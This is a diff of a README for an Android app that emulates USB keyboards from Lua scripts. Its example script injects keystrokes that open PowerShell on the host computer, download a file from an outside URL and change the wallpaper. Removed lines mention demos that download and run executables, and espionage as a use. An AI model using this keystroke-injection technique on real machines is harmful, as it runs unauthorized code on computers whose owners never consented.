@@ -1,44 +1,64 @@
-# Android HID Script
+# Android USB Script
 
 **Use at your own risk. For educational purposes only.**
 
-An Android app that provides a simple Lua interface for emulating an HID device, on top of the existing `android-keyboard-gadget` patch by `pelya`. **Root access is required.**
+An Android app that provides a simple Lua interface for enumerating and interfacing
+with arbitrary composite USB devices.
+
+**Root access is required.**
+
+The best way to explain what this app does is with a code example. The following script
+does the following when interpreted by this app:
+
+1. Configures your phone to become a USB keyboard
+2. Sends a series of key presses to the computer your phone is plugged in to, changing
+its wallpaper
+
+```lua
+-- create a USB composite device composed of a single keyboard
+usb = luausb.create({ id = 0, type = "keyboard" })
+kb = usb.dev[1]
+
+local file = "https://i.redd.it/ur1mqcbpxou51.png"
+
+while true do
+    -- wait for the phone to be plugged into a computer
+    while not kb.test() do usb.delay(1000) end
+
+    usb.delay(1000)
+
+    kb.press_keys(kb.LSUPER, kb.R)  -- open the Windows run dialog
+    usb.delay(2000)                 -- wait 2 seconds
+    kb.send_string("powershell\n")  -- pop open a powershell window
+    usb.delay(2000)
+
+    -- enter a script that changes your wallpaper
+    kb.send_string("[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ..
+            "(new-object System.Net.WebClient).DownloadFile('" .. file .. "',\"$Env:Temp\\b.jpg\");\n" ..
+            "Add-Type @\"\n" ..
+            "using System;using System.Runtime.InteropServices;using Microsoft.Win32;namespa" ..
+            "ce W{public class S{ [DllImport(\"user32.dll\")]static extern int SystemParamet" ..
+            "ersInfo(int a,int b,string c,int d);public static void SW(string a){SystemParam" ..
+            "etersInfo(20,0,a,3);RegistryKey c=Registry.CurrentUser.OpenSubKey(\"Control Pan" ..
+            "el\\\\Desktop\",true);c.SetValue(@\"WallpaperStyle\", \"2\");c.SetValue(@\"Tile" ..
+            "Wallpaper\", \"0\");c.Close();}}}\n" ..
+            "\"@\n" ..
+            "[W.S]::SW(\"$Env:Temp\\b.jpg\")\n" ..
+            "exit\n")
+
+    -- wait for the phone to be unplugged
+    while kb.test() do usb.delay(1000) end
+end
+```
 
 ## Requirements
-**This app will not work on every Android device.** If your Android OS has Linux Kernel version >= 3.18 and is compiled with configfs and f_hid, then the app can try to create usb gadgets for mouse and keyboard.
+**This app will not work on every Android device.** If your Android OS has Linux Kernel
+version >= 3.18 and is compiled with configfs and f_hid, then the app can try to create usb
+gadgets.
 
-If your Android OS is compiled with the [android-keyboard-gadget kernel patch](https://github.com/pelya/android-keyboard-gadget), then the app can use the usb gadgets it provides.
-
-## HID Emulation?
-```
-In computing, the USB human interface device class (USB HID class) is a part of the USB 
-specification for computer peripherals: it specifies a device class (a type of computer 
-hardware) for human interface devices such as keyboards, mice, game controllers and 
-alphanumeric display devices.
-                                                                      - Wikipedia
-```
-This app provides an easy way to script HID interactions intuitively, with feedback. In addition, it contains wrappers around the HID devices allowing developers to easily integrate HID functionality into their own apps.
-
-On the news recently, use and abuse of the trust given to HID devices was demonstrated with the [BadUSB](https://www.wired.com/2014/07/usb-security/) attack, where USB devices were abused to utilize HID protocol to carry out nefarious actions.
-
-## Use Cases of Scripted HID Emulation
-- Automation of deployment solutions (ie. configuring computer BIOs settings in an automated fashion)
-- Mobile password managers that type in your credentials for you, on computers you do not trust
-- Use in computer espionage or social engineering attacks
-
-## Features
-A couple of demo applications are implemented:
-- Fuzzing of HID protocol
-- PowerShell download and run executable
-- PowerShell download and run PowerShell script
-- Serial transfer of data through output reports
-- Change wallpaper ([video demonstration](https://my.mixtape.moe/zxerjz.mp4))
-
-New demo applications can be added to `assets/scripts`. The API is pretty much self-documenting, just look at the existing demos to get a feel for how the API works.
-
-For people who want to implement HID functionality in their own apps, HID interfacing code available [here (HID.java)](https://github.com/Netdex/android-hid-script/blob/master/app/src/main/java/cf/netdex/hidfuzzer/hid/HID.java), 
-and a simple ease-of-use wrapper is available [here (HIDR.java)](https://github.com/Netdex/android-hid-script/blob/master/app/src/main/java/cf/netdex/hidfuzzer/hid/HIDR.java). The documentation should be enough to understand how it works.
+New demo applications can be added to `assets/scripts`. The API is pretty much self-documenting,
+just look at the existing demos to get a feel for how the API works.
 
 ## Third-party
-- Requires ChainFire's [libsuperuser](https://github.com/Chainfire/libsuperuser) to keep a su shell open.
-- Requires LuaJ to provide Lua binding and interpret Lua scripts.
+- [libsuperuser](https://github.com/Chainfire/libsuperuser)
+- [LuaJ](http://www.luaj.org/luaj/3.0/README.html)
